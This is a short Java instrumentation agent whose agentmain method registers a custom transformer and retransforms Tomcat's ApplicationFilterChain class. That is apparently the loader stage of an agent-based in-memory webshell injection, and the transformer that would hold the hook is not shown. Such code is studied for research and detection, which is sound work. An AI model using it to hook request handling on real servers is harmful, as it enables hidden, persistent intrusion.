package priv.ga0weI.baseonagent;

import java.lang.instrument.Instrumentation;
import java.lang.instrument.UnmodifiableClassException;

public class Agentthing {
    public  static  void  agentmain(String agentArgs, Instrumentation inst) throws UnmodifiableClassException {
        Transformerthings tf = new Transformerthings();//new my transformer
        inst.addTransformer(tf,true);//added
        Class[] allclass = inst.getAllLoadedClasses();//get all class load by ...
        for (Class cl : allclass){
            if (cl.getName().equals("org.apache.catalina.core.ApplicationFilterChain"))//for Tomcat
            {
                inst.retransformClasses(cl);
            }
        }
    }
}
